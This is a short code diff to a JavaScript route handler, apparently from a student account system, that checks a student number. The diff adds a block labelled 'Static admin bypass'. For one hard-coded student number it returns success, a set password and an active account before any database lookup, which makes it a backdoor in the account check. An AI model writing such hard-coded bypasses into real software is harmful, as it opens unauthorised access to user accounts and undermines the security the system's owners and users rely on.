@@ -12,6 +12,15 @@ export async function GET(request) {
       );
     }
 
+    // Static admin bypass
+    if (studentNumber.toString().trim() === "02230125") {
+      return Response.json({
+        success: true,
+        hasSetPassword: true,
+        isActive: true,
+      });
+    }
+
     // Find user by student number
     const user = await prisma.user.findUnique({
       where: { studentNumber: studentNumber.toString() },
